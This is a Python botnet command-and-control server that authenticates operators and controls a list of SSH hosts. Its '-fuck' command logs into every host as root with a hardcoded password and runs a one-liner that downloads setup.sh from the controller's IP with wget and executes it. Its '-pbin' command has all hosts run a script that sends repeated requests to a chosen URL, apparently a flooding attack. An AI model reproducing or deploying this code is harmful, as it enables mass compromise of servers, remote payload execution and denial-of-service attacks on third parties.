import os
import sys
import socket
import getpass
import threading
import ipgetter
from pssh.pssh2_client import ParallelSSHClient

user = getpass.getuser()

syntax_prefix = "-"

class puts:

    @staticmethod
    def err(string):
        sys.stderr.write(string + "\n")

    @staticmethod
    def out(string):
        sys.stdout.write(string + "\n")


def client(conn, addr):
    hosts = []
    try:
        file = open("/var/log/Paison/ssh_servers.txt", "r")
        for line in file:
            hosts.append(line.strip("\r\n"))

        puts.out("     - loaded client with %d servers" % (len(hosts)))
        conn.send("Your IP Address: \033[32m{} \033[0mHas been logged. \r\n\033[31mEverything you do will be logged.\r\n".format(addr[0]))
        puts.out("     - prompting client with login")
        conn.send("\033[0mu\033[31ms\033[32me\033[1;36mr\033[35mn\033[37ma\033[31mm\033[33me\033[0m: ")
        username = conn.recv(1024).strip("\r\n")
        conn.send("\033[0mp\033[31ma\033[32ms\033[1;36ms\033[35mw\033[37mo\033[31mr\033[33md\033[0m: ")
        password = conn.recv(1024).strip("\r\n")
        isUserAnAccount = os.path.isfile("/var/log/Paison/Accounts/%s.acc" % (username))
        if (isUserAnAccount == True):
            conn.send("\033[32mAccount Status - Username - OK\r\n")
            filen = "/var/log/Paison/Accounts/%s.acc" % (username)
            f = open(filen, "r")
            for line in f:
                line = line.strip("\r\n")
                puts.out("     - expected password: %s | sent password: %s" % (line, password))
                if (password in line):
                    conn.send("\033[32mAccount Status - Password - OK\r\n")
                    conn.send("\033[0mPress Enter after receiving prompt to initiate CNC.\r\n")
                    while True:
                        try:
                            conn.send("\033[0m[root@%s]~# " % (username))
                            nCmd = conn.recv(1024).strip("\r\n")
                            blank = conn.recv(1024)
                            if (not nCmd):
                                continue

                            xCmd = nCmd.split(' ')
                            
                            if (xCmd[0] == syntax_prefix+"fuck"):
                                if (username == "admin"):
                                    ip = ipgetter.myip()
                                    payload_install = "wget http://%s/setup.sh -O /tmp/setup.sh; cd /tmp/; chmod +x setup.sh; ./setup.sh; rm -rf setup.sh;" % ip
                                    try:
                                        client = ParallelSSHClient(hosts, user="root", password="NotAHakr", port=22, timeout=10)
                                        output = client.run_command(payload_install)
                                        for host, host_output in output.items():
                                            for line in host_output.stdout:
                                                puts.out(line)
                                    except Exception as e:
                                        puts.out(e)
                                else:
                                    puts.out("     - %s tried executing ssh server installations" % (username))

                            elif (xCmd[0] == syntax_prefix+"help"):
                                # send help
                                conn.send("Help Page\r\n")

                            elif (xCmd[0] == syntax_prefix+"clear"):
                                conn.send('\033[2J')

                            elif (xCmd[0] == syntax_prefix+"logout"):
                                conn.close()

                            elif (xCmd[0] == syntax_prefix+"pbin"):
                                URL = xCmd[1]
                                Total_Requests = xCmd[2]
                                Wait_Time = xCmd[3]
                            
                                if (not xCmd[1]):
                                    conn.send("Error: URL Variable Not Set\r\n")
                                    conn.send("Usage: !*pbin URL Total_Requests Wait_Time\r\n")

                                elif (not xCmd[2]):
                                    conn.send("Error: Total Requests Not Set\r\n")
                                    conn.send("Usage: !*pbin URL Total_Requests Wait_Time\r\n")

                                elif (not xCmd[3]):
                                    conn.send("Error: Wait Time Not Set\r\n")
                                    conn.send("Usage: !*pbin URL Total_Requests Wait_Time\r\n")

                                payload_pbin = "python /var/www/html/send.py %s %s %s" % (URL, Total_Requests, Wait_Time)
                                
                                try:
                                    client = ParallelSSHClient(hosts, user="root", password="NotAHakr", port=22, timeout=10)
                                    client.run_command(payload_pbin)

                                except Exception as e:
                                    puts.out(e)

                        except:
                            conn.send("Invalid Syntax\r\n"); pass

                elif (password not in line):
                    conn.send("\033[31mAccount Status - Password - BAD\r\n")

                else:
                    conn.send("\033[31mAccount Status - Password - Error\r\n")

        elif (isUserAnAccount == False):
            conn.send("\033[31mAccount Status - Username - BAD\r\n")

    except:
        puts.out("     - client disconnected {}:{}".format(addr[0], addr[1]))
        if (conn):
            conn.close()
        

def server():
    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        sock.bind(("0.0.0.0", 3333))
    except socket.error:
        puts.err("[-] Socket Error: Failed to bind to address, Address already in use.")

    sock.listen(0)
    while True: # creating infinite while loop to run forever until error
        try:
            conn, addr = sock.accept()
            puts.out("[+] Connection Recieved. Forwarding client to shell. {}:{}".format(addr[0], addr[1]))
            try:
                threading.Thread(target=client, args=(conn, addr,)).start()
            except Exception:
                puts.err("     - could not send client. error occured.")
            
            puts.out("     - sent client to shell.")
            

        except socket.error as e:
            puts.err("[-] Socket Error: Unknown error occured\n%s" + str(e))


server()
